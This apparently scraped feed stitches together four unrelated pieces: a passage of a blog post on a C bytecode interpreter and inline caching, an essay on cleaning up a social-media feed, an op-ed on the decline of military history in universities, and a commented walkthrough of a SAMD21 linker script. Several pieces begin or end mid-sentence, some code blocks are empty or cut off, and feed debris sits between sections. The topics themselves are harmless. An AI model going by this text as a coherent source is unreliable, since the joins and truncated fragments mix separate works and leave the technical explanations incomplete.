Objects are implemented as a tagged union, but for the purposes of this blog
post the representation does not matter very much.</p>

<div><div><pre><code><span>typedef</span> <span>enum</span> <span>{</span>
  <span>kInt</span><span>,</span>
  <span>kStr</span><span>,</span>
<span>}</span> <span>ObjectType</span><span>;</span>

<span>typedef</span> <span>struct</span> <span>{</span>
  <span>ObjectType</span> <span>type</span><span>;</span>
  <span>union</span> <span>{</span>
    <span>const</span> <span>char</span> <span>*</span><span>str_value</span><span>;</span>
    <span>int</span> <span>int_value</span><span>;</span>
  <span>};</span>
<span>}</span> <span>Object</span><span>;</span>
</code></pre></div></div>

<p>These types have methods on them, such as <code>add</code> and <code>print</code>. Method names are
represented with an enum (<code>Symbol</code>) though strings would work just as well.</p>

<div><div><pre><code><span>typedef</span> <span>enum</span> <span>{</span>
  <span>kAdd</span><span>,</span>
  <span>kPrint</span><span>,</span>

  <span>kUnknownSymbol</span> <span>=</span> <span>kPrint</span> <span>+</span> <span>1</span><span>,</span>
<span>}</span> <span>Symbol</span><span>;</span>
</code></pre></div></div>

<p>The representation of type information isn’t super important. Just know that
there is a function called <code>lookup_method</code> and that it is very slow. Eventually
we’ll want to cache its result.</p>

<div><div><pre><code><span>Method</span> <span>lookup_method</span><span>(</span><span>ObjectType</span> <span>type</span><span>,</span> <span>Symbol</span> <span>name</span><span>);</span>
</code></pre></div></div>

<p>Let’s see how we use these <code>lookup_method</code> in the interpreter.</p>

<h3 id="interpreter">Interpreter</h3>

<p>There’s no way to call these methods directly. For the purposes of this demo,
the only way to call these methods is through purpose-built opcodes. For
example, the opcode <code>ADD</code> takes two arguments. It looks up <code>kAdd</code> on the left
hand side and calls it. <code>PRINT</code> is similar.</p>

<p>There are only two other opcodes, <code>ARG</code> and <code>HALT</code>.</p>

<div><div><pre><code><span>typedef</span> <span>enum</span> <span>{</span>
  <span>// Load a value from the arguments array at index `arg'.</span>
  <span>ARG</span><span>,</span>
  <span>// Add stack[-2] + stack[-1].</span>
  <span>ADD</span><span>,</span>
  <span>// Pop the top of the stack and print it.</span>
  <span>PRINT</span><span>,</span>
  <span>// Halt the machine.</span>
  <span>HALT</span><span>,</span>
<span>}</span> <span>Opcode</span><span>;</span>
</code></pre></div></div>
<p>Bytecode is represented by a series of opcode/argument pairs, each taking up
one byte. Only <code>ARG</code> needs an argument; the other instructions ignore theirs.</p>

<p>Let’s look at a sample program.</p>

<div><div><pre><code><span>byte</span> <span>bytecode</span><span>[]</span> <span>=</span> <span>{</span><span>/*0:*/</span> <span>ARG</span><span>,</span>   <span>0</span><span>,</span>
                   <span>/*2:*/</span> <span>ARG</span><span>,</span>   <span>1</span><span>,</span>
                   <span>/*4:*/</span> <span>ADD</span><span>,</span>   <span>0</span><span>,</span>
                   <span>/*6:*/</span> <span>PRINT</span><span>,</span> <span>0</span><span>,</span>
                   <span>/*8:*/</span> <span>HALT</span><span>,</span>  <span>0</span><span>};</span>
</code></pre></div></div>

<p>This program takes its two arguments, adds them together, prints the result,
and then halts the interpreter.</p>

<p>You may wonder, “how is it that there is an instruction for loading arguments
but no call instruction?” Well, the interpreter does not support calls. There
is only a top-level function, <code>eval_code</code>. It takes an object, evaluates its
bytecode with the given arguments, and returns. Extending the interpreter to
support function calls would be another good exercise.</p>

<p>The interpreter implementation is a fairly straightforward <code>switch</code> statement.
Notice that it takes a representation of a function-like thing (<code>Code</code>) and an
array of arguments. <code>nargs</code> is only used for bounds checking.</p>

<div><div><pre><code><span>typedef</span> <span>unsigned</span> <span>char</span> <span>byte</span><span>;</span>

<p>Both <code>ADD</code> and <code>PRINT</code> make use of <code>lookup_method</code> to find out what function
pointer corresponds to the given <code>(type, symbol)</code> pair. Both opcodes throw away
the result. How sad. Let’s figure out how to save some of that data. Maybe we
can use the <code>caches</code> slot in <code>Code</code>.</p>

<h3 id="inline-caching-strategy">Inline caching strategy</h3>

<p>Since the Smalltalk-80 paper tells us that the receiver type is unlikely to
change from call to call at a given point in the bytecode, let’s cache <em>one</em>
method address per opcode. As with any cache, we’ll have to store both a key
(the object type) and a value (the method address).</p>

<p>There are several states that the cache could be in when entering the an
opcode:</p>

<ol>
  <li><strong>If it is empty</strong>, look up the method and store it in the cache using the
current type as a cache key. Use the cached value.</li>
  <li><strong>If it has an entry and the entry is for the current type</strong>, use the cached
value.</li>
  <li>Last, <strong>if it has an entry and the entry is for a different …</strong></li></ol></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I’m not a “systems” person.</p>
<p>It’s not like I never tried - making schedules, using a Pomodoro timer,&lt;insert productivity “hack”&gt; - they didn’t work because I was trying to fit a square peg in a round hole.</p>
<p><img src="https://user-images.githubusercontent.com/32199592/104540572-bb4c3d00-5645-11eb-86f9-de27e6b8d07d.jpg" alt="square_peg.jpg"> <small> <a href="https://baddadcartoons101.wordpress.com/2017/09/04/square-peg-and-a-round-hole/" target="_blank" rel="noopener noreferrer"> <i> Source: BadDadCartoons </i> </a> </small> </p>
<p>What I ended up doing was instead of focusing on optimising the time I spent productively - i.e. the “deep work” part (which happened rather spontaneously independent of whether I’m on a productivity hack or not) - I decided to focus on the time that was not “deep work” i.e. time spent on ‘distractions’ or entertainment.</p>
<p>I used to spend an unhealthy amount of time in a day on Instagram where the feed was mostly filled with memes. I also used Quora/Twitter a lot.</p>
<p>Consuming content is easy. Like junk food. It's almost embedded in our reflexes.</p>
<p>But here’s the thing - you can easily turn your distractions to things that can benefit you.</p>
<p>How?</p>
<p>Start with cutting off distractions that have too much noise i.e. do not give you a good return of investment on your time in any of the following:</p>
<ul>
<li>Specific knowledge/skills</li>
<li>Specific insight</li>
<li>Accessing and leveraging a network</li>
</ul>
<p>For the ones that remain, optimise the shit out of them.</p>
<p>For me, that meant Instagram was instantly off the list. Twitter and Quora were okay, but I had a long way to go.</p>
<br>
<h3> Optimising your feed </h3>
<p>Social media “feed”.
What comes to your mind when you think of the word - “feed”?</p>
<p>This comes to my mind when I think “feed”</p>
<p><img src="https://user-images.githubusercontent.com/32199592/104541024-c0f65280-5646-11eb-92f6-de5227d4b8a1.png" alt="sheep.jpg"> <i> <small> Sheep, “feed”ing </small>
</i> </p>
<p>Our minds are literally “fed” content.</p>
<p>“We are what we eat” - this doesn’t just stand for physical, tangible food - it applies to the digital content we feed our mind with.</p>
<p>I want you to take this literally because we take our attention for granted. In a digital economy run by monetising attention - it will naturally be full of noise.</p>
<p>Most of the content we read or watch is optimised solely for capturing our attention and clicks. More times than not, you don’t need something that is being shown to you. You will be perfectly fine without knowing it existed. Yep, sounds crazy but it is true.</p>
<p>I’m not trying to say social media is bad. Social media is an amplifier of all there is - of both the good stuff and the bad. It is an amplifier of your primal instincts so if you don’t proactively weed out the bad stuff from your feed regularly, you are going to get sick. Really sick.</p>
<p>What that means is, with some conscious effort you can filter out your feed to keep only the things that benefit you. Here’s how:</p>
<p><strong>Tip #1</strong></p>
<p>Don’t follow brands. Follow people.</p>
<p>I’ll bring the sheep here, again.</p>
<p>When I imagine a brand account, I imagine the shepherd.</p>
<p>And all of the 100-200-500k followers as the sheep.</p>
<p><img src="https://user-images.githubusercontent.com/32199592/104541200-1599cd80-5647-11eb-8d7f-f89ae517eb81.png" alt="shepherd.jpg"></p><p>The only reason brand accounts exist is to convince you - in obvious or non-obvious ways - that you need their product in some way or the other. 99-100% of brand accounts posts are pure marketing. You do not need them.
It’s like bombarding your own feed with their ads - full time - <em>with your full consent</em>. Especially so if you are already consuming a brand’s product. Why?!</p>
<p>Who should you follow then?</p>
<p>Follow people. Now, you might argue that people themselves can be brands and you are absolutely right - avoid them too. This goes for popular celebrities, sportspeople, singers etc.
Around half the time, you are probably going to see marketing stuff from them as well. Not all are like that of course, apply your judgement. I respect a lot of celebrities but I don’t follow them because I simply don’t need their opinion in my feed - I couldn’t care any less - they are artists, I liked their art, I liked how they performed but that doesn’t mean I like their opinion nor do I need to listen to them on every single issue there is. At the end of the day, including every celebrity or band or anything in your feed just increases the “distraction” score in your feed.</p>
<p>Okay. Brands are out. Brand people are out. What next?</p>
<p>Follow thinkers. Follow do-ers. Follow people who are creating something.</p>
<p>Some follows I would recommend in no particular order:

<a href="https://twitter.com/david_perell/" target="_blank" rel="noopener noreferrer"> @David_Perell </a>,</p>
<p>This is a subjective list, of course, but the idea remains the same: when you scroll - scroll to think, not to react. The posts/tweets in your feed should stop and make you think. If they enable <em>only</em> a reaction like rage or anxiety - remove it.</p>
<blockquote><div lang="en" dir="ltr"><p>A simple heuristic to clean your social media feed:</p><p>Scroll to think, not to react</p><p>Reduce content that enables only a reaction. <br>Increase content that stops and makes you think.</p></div>— Akhil (@akhlkg) <a href="https://twitter.com/akhlkg/status/1346891698861862913?ref_src=twsrc%5Etfw">January 6, 2021</a></blockquote> 

<p><strong>Tip #2</strong></p>
<p>When something is trending and it doesn’t really matter to you much, mute all the words/hashtags/etc related to it. The “Explore” section in Twitter is a black hole of distractions. Twitter will try to shove you up with random stuff all the time in your feed - but mute/block/ignore them all - this takes conscious effort but is well worth it.</p>

<ol>
<li>
<p><strong>Ignore ‘the first wave’</strong></p>
<p>The first wave is the most emotional one. The purpose of the first wave, knowingly or unknowingly, is to polarise. There is no place for rationality in the first wave of posts, trends, articles, etc. You are likely going to see the same type/flavour of content - over and over from all sorts of people which essentially just convey the same thing in different shades of rage. There is nothing against the stream, yet. Mute ‘em all.</p>
</li>
<li>
<p><strong>Assess the aftermath</strong></p>
<p>Once the first wave is gone and the hashtags die, start looking around. This can be anywhere from 1 week to several months depending on the issue. You are searching for truth, so don’t look at the news - if you’re reading articles online, don’t just look at one publisher, read on the same article by different publishers. Remember, each publishing house has a “flavour” of twisting things. An easy way to cancel the bias out is to read from many publishers and see what remains common. Now analyse the common facts - those are the fundamental facts that supposedly happened and anything above that, is just an opinion.</p>
<p>You can also look if the “thinkers” are reacting. If so, see what they are saying.
It takes effort to get to the truth and navigate through the noise, so I don’t end up doing this a lot of times because I simply didn't care about the event as much as I thought. And it looks like I end up doing okay.</p>
</li>
</ol>
<hr>

<p>That’s about it. In theory, you can apply these principles to any social media platform. I tested and developed these on Twitter but the fundamental idea remains the same: <strong>scroll to think, not to react.</strong></p>
<p>And this fundamental idea helped me a lot. Twitter taught me a lot of things that form a core part of who I am now - staying healthy, strength training, mental models, entrepreneurship, making money online, writing.</p>
<p>You can use your distractions to literally change your life - and I really hope you do!</p></div></div>]]>

Many universities agree on the answer: “Absolutely nothing.”</p><p>Although anthropologists and archeologists still wonder why human beings have for so long organized themselves to fight, the study of war in history and political science departments is fading. Senior scholars are retiring and not being replaced, or their posts are allocated to other fields of history. Each year, fewer courses are offered on great conflicts such as the Napoleonic wars, the total wars of the 20th century, and the Cold War. The Second World War, you may hear on campus, “has been done.”</p><p>Yet war remains one of the events—along with revolution, famine, financial collapse and, as we are learning again, pandemics—that change the course of history. In privileged countries, we forget the importance of military conflicts because we have enjoyed the “Long Peace” that followed the Second World War. Other places have not been so fortunate, with wars around the world almost every year since 1945, bringing millions of deaths and creating millions more refugees. Meanwhile, the world’s great powers maintain large military establishments, and still prepare for battle. </p><p>It is as important as ever to understand war—its causes, nature and consequences—and the many ways that conflicts have shaped our societies. The conquering armies that came from the Arabian Peninsula in the 7th century after the Prophet Mohammad’s death created new empires and spread the new religion of Islam across the Middle East, North Africa and the Iberian Peninsula. The Seven Years’ War (1756-1763), a global conflict, laid the foundations for the dominance of the British Empire and the bankruptcy of France, which helped to fuel the French Revolution.&nbsp; </p><p>War can also speed up advances in science and technology that have benefits in peacetime. Think of the development of penicillin, blood transfusions, radar, or the transistor. And war can bring about significant social change, often for the better. The need for mass armies in the 19th and 20th centuries meant that governments had to treat the lower classes better, whether by educating them or by improving public health. In many countries that fought in the two world wars, ruling classes recognized the contributions of women and the working classes, granting them the franchise and introducing social benefits. </p><p>So why do history faculties, which accept the need to study other great forces in history, such as changes in the means of production or systems of belief, shy from war? I suspect that horror at the phenomenon itself has affected universities’ willingness to treat it as a subject for scholarship. Years ago, when I proposed a new course on war and society, an education consultant asked me, “Why don’t you call it peace studies?” </p><p>I have since met with incomprehension, even hostility, when I have pointed out that wars can bring unintended benefits. However much I say that we would not <em>choose</em> to make war in order to improve our societies, I am charged with loving war. Yet nobody would say that the study of imperialism, racism or famine means that we think those are good things.</p><p><strong>The history of war is neglected for other reasons, too. </strong>First, separate histories—of women, emotions, food and the environment, for example—have come along. Quite rightly, room has been made for them in the big and eclectic house that is the study of the past. However, part of the shift away from war studies owes to the quest for “social justice”—intended as a drive for radical change in society at large—that has taken root in many history faculties. </p><p>Here, for example, is how the chair of Historical and Cultural Studies at the Scarborough campus of the University of Toronto, Natalie Rothman, <a href="https://www.utsc.utoronto.ca/hcs/">welcomed students</a> this autumn: “As a department, we have strengthened our resolve to confront racism, colonialism and Islamophobia throughout our curriculum and in our co-curricular initiatives.” The University of Berkeley in California <a href="https://history.berkeley.edu/graduate/prospective-students/admissions">asks prospective graduate students</a> to provide “evidence of how you have come to understand the barriers faced by others, evidence of your academic service to advance equitable access to higher education for women, racial minorities, and individuals from other groups that have been historically underrepresented in higher education, evidence of your research focusing on underserved populations or related issues of inequality, or evidence of your leadership among such groups.” It is hard to quarrel with such goals, but their impact on curriculum has been to <a href="http://www.nytimes.com/2016/08/29/opinion/why-did-we-stop-teaching-political-history.html?smid=em-share">downgrade subjects such as political and military history,</a> which are seen as too focused on elites and complicit with hierarchy and oppression. </p><p>Another factor is that history overall is worryingly in decline as an academic subject. While it remains popular among publishers and readers, enrollments in history majors are significantly down. They have <a href="https://www.historians.org/publications-and-directories/perspectives-on-history/december-2018/the-history-ba-since-the-great-recession-the-2018-aha-majors-report">dropped more than any other major</a> in the humanities—perhaps by as much as <a href="http://www.chronicle.com/article/why-are-students-ditching-the-history-major">one-third</a> in <a href="https://www.insidehighered.com/news/2018/11/27/new-analysis-history-major-data-says-field-new-low-can-it-be-saved">American universities</a> in the past decade. At the University of Toronto, where I am a professor, colleagues fear that history enrollment may be down as much as 50% over the same period. Even in the United Kingdom, where history remains popular among undergraduates, the number of those majoring in history has dropped by about <a href="https://www.economist.com/britain/2019/07/18/the-study-of-history-is-in-decline-in-britain">one-tenth</a> in the past decade. </p><p>Part of the reason is that, given the lingering effects of the 2008 financial crisis and uncertainty over the economy, students and their parents want university courses to lead to jobs. The decline in history students in turn affects university hiring, and the fewer the tenured faculty, the fewer places for the doctoral students who are the future of the profession.&nbsp; </p><p>Faculties and administrators are not necessarily helping matters, reluctant to include popular courses on war in the curriculum, or to support well-established centers for the study of conflict, some of which are being remodeled, such as the Laurier Centre for Military, Strategic and Disarmament Studies, in Waterloo, Ontario, which will focus more on Canadian history; another at the University of Calgary is fading as those who retire are not replaced. This seems to be particularly true of elite universities. War studies remains in better health at military colleges or some second-tier public universities, while schools of public policy are also still teaching military history, strategic studies and diplomatic history. </p><p>But those in other fields stereotype war studies, characterizing it as too narrowly focused on tactics, battles, or “toys for boys,” meaning armaments. If that caricature were ever true, it has not been for decades. The great historian Sir Michael Howard, who pioneered the modern study of war and trained generations of historians, always insisted that what he was doing was to consider wars within their social and political contexts as a part of the great sweep of history, not somehow separate from it. &nbsp;</p><p><strong>My own evidence of the distaste for military and diplomatic history </strong>at North American universities comes from tales exchanged privately among fellow academics. One retired Canadian military historian recounted that his old faculty had asked him how to reverse the collapse in enrollment. He suggested a course in military history, but the response was a flat no. When a university in the Maritime provinces of eastern Canada was offered a fully funded post in naval history a few years ago—a good fit in a port town that had been deeply affected by conflict on the Atlantic—members of the department rejected it. </p><p>Yet, despite the overall downturn in university history programs, we know from course enrollments that students are interested in war, as indeed they are in international relations, when they get the chance to study them: At Yale, Paul Kennedy’s “Military History of the West” attracted large crowds; at Toronto’s Ryerson University, international relations courses are the most popular choices among students.</p><p>I would not suggest that student preference should determine what departments offer. But they should at least be listened to. Much more important is what we, as societies, want our future leaders to know. Political history, diplomatic history and the study of war—they all offer critical warnings and instructive analogies to our times. Social and cultural histories, and history from the bottom up, add to our understanding too. But we need balance, and a sense of how the micro- and macro-histories mesh with each other. </p><p>Do we really want citizens who have so little knowledge of how war helped to shape our values and societies and our world? Do we ever want another president asking, as Donald Trump <a href="https://www.businessinsider.com/trump-pearl-harbor-memorial-tour-john-kelly-stable-genius-2020-1?r=US&amp;IR=T">did</a> during a visit to the Pearl Harbor memorial: “What’s this all about? What’s this a tour of?” </p><p>If we aren’t aware of how wars happen, we may fail to recognize warning signs when the next conflict brews, as it will. </p><p><strong>Margaret MacMillan is a professor of history at the University of Toronto and emeritus professor at the University of Oxford. Her latest book, </strong><em><strong><a href="https://www.penguinrandomhouse.com/books/609692/war-how-conflict-shaped-us-by-margaret-macmillan/">War: How Conflict Shaped Us</a></strong></em><strong>, was among the </strong><em><strong>New York Times</strong></em><strong> 10 Best Books of 2020. </strong></p></div></div>]]>

    <p>While developing the firmware for Winterbloom's <a href="https://github.com/theacodes/Winterbloom_Castor_and_Pollux">Castor &amp; Pollux</a>, I got very curious as to just what the Microchip/Atmel-provided linker script was doing.</p>
<p>If you've never heard of or seen a linker script before you're not alone. Most of us never even have to think about them, however, on memory constained embedded devices it's not uncommon to need to modify the default linker script.</p>
<p>The linker script controls how <code>ld</code> combines all of your <code>.o</code> files into a single <code>.elf</code> and how that resulting <code>.elf</code> file gets loaded by the target processor.</p>
<p>So I was staring at this script that made absolutely no sense to me. It's filled with incantations and mysterious symbols and there's no indication of what they're for or where they come from.</p>
<p>So I did a <strong>lot</strong> of research and now I can present to you <strong>the most thoroughly commented linker script</strong><sup id="fnref:probably"><a href="#fn:probably">1</a></sup>.</p>
<p>You can see this script in its entirety, comments and all, on <a href="https://github.com/theacodes/Winterbloom_Castor_and_Pollux/blob/master/firmware/scripts/samd21g18a.ld">GitHub</a>. But if you'd like to read it here instead it's transcribed below.</p>
<h2 id="output-format">Output format</h2>
<p>Output format sets the ELF output format to use a specific BFD backend.</p>
<p>The first is the default BFD. The second and third arguments are used
when big (-EB) or little (-EL) endian is requested.</p>
<p>Since the SAM D series are configured with only little endian support,
"elf32-littlearm" is used across the board. This option seems to be
included by Atmel/Microchip out of an abundance of caution, as
arm-none-eabi-ld will do the right thing and use "elf32-littlearm" by
default.</p>
<p>The list of acceptable values can be obtained using <code>objdump -i</code>.</p>

<p>These variables are used by the following "MEMORY" command to define
the various memory spaces.</p>
<p>For the SAMD21G18A used by this project, the available Flash is
262kB and the available SRAM is 32kB.</p>
<p>This project also reserves 8kB for the bootloader and 1kB for

<p>ARM Cortex-M processors use a descending stack and generally
require stack space to be set aside in RAM.</p>
<p>The application's behavior determines just how much stack space
should be reserved. I generally start with 2kB (0x800) of
stack space for Cortex-M0+ projects programmed in C .</p>
<p>You can analyze stack usage in GCC using the <code>-fstack-usage</code>

<p>This section declare blocks of memories for specific purposes. Since an
ARM's address space is generally split between Flash, SRAM, peripherals,
and other regions, it's necessary to tell the linker where different
types of data can go in the address space.</p>
<p>These blocks will be used in the <code>SECTIONS</code> command below.</p>

</pre>
<p>Start with the Flash memory region. On the SAMD21, Flash starts at
the beginning of the address space (<code>0x00000000</code>) and is contiguous
right up to the size of the Flash. Flash is marked a <code>rx</code> so
that the linker knows that this space is read-only (<code>r</code>) and
executable (<code>x</code>).</p>
<p>The "bootloader" section allows this firmware to work with the uf2
bootloader. The bootloader takes the first 0x2000 bytes of flash
memory.</p>

</pre>
<p>Following the bootloader is the flash memory used by the application,
called "rom" here - even though it's flash, the name is just a name
and doesn't carry special meaning.</p>
<p>The total length of the rom block is the MCU's flash size minus the
bootloader's size and any space reserved for "non-volatile memory"
by the application.</p>

</pre>
<p>The "nvm" block is space set aside for the application to store
user settings and calibration data in the MCU's flash.</p>
<p>The block is located right at the end of the flash space. This
is useful because it means that it says in a fixed location
regardless of how much flash space the application takes up
in "rom". Explicitly defining this section also lets the
linker ensure that application code doesn't overwrite the
data in this region.</p>
<p>This block is marked as read-only (<code>r</code>) because flash can not
be written in the same way as normal memory, however, the
application can use the SAMD's NVM peripheral to write data in
this region.</p>

<p>The "ram" block is mapped to the CPU's SRAM and it's where
the stack, heap, and all variables will go.</p>
<p>For the SAMD21, SRAM starts at 0x20000000 and is contiguous
for the size of the SRAM.</p>

<h2 id="sections">Sections</h2>
<p>The sections command tells the linker how to combine the
input files into an output ELF and where segments belong
in memory.</p>
<p>The linker takes a set of input files containing the "input
sections" and uses this to map them to "output sections"
which are placed in the output ELF file.</p>
<p>While the most important sections to think about here
are the ones that'll be placed into the memory (segments)
some sections are just placed in the output ELF for debugging.</p>

<p>The vector table defines the initial stack pointer and
interrupt/exception routines for the ARM CPU and device
peripherals. Every Cortex-M project needs this.</p>
<p>For the SAM D series the vector table is expected
to be at address 0x00000000 after reset. Since
flash memory starts at 0x00000000, the first values
in flash should be the vector table.</p>
<p>When defining the vector table in code you must use
<code>__attribute__ ((section(".vectors")))</code> to tell
GCC to place the vector table into the section
named ".vectors" in the input object file so that
the linker can find it.</p>
<p>Note that since this project uses the UF2 bootloader,
this actually gets placed at the beginning of the
program's flash area (0x2000). The Cortex-M allows
changing the vector table after initialization,
so the startup script sets the Vector Table Offset
Register (<code>SCB-&gt;VTOR</code>) to <code>_sfixed</code> during its
intialization. The <code>_efixed</code> symbol is unused but
included for completeness.</p>

<p>Include code and read-only data sections from all
input files.</p>
<p>By default, GCC places all program code into a section named
".text" and read-only data (such as const static variables) into
a section named ".rodata" in the input object files. This naming
convention is from the ELF ABI specification.</p>
<p>GCC generates three "flavors" of sections in object files:</p>
<ul>
<li><code>.{section}</code>: the basic section.</li>
<li><code>.{section}.*</code>: sections generated by <code>-ffunction-sections</code> and
<code>-fdata-sections</code> so that each function/data has a unique
section.</li>
<li><code>.gnu.linkonce.{type}.*</code>: sections generated by GCC so the
linker can remove duplicates. Seems to be related to
Vague Linking.</li>
</ul>
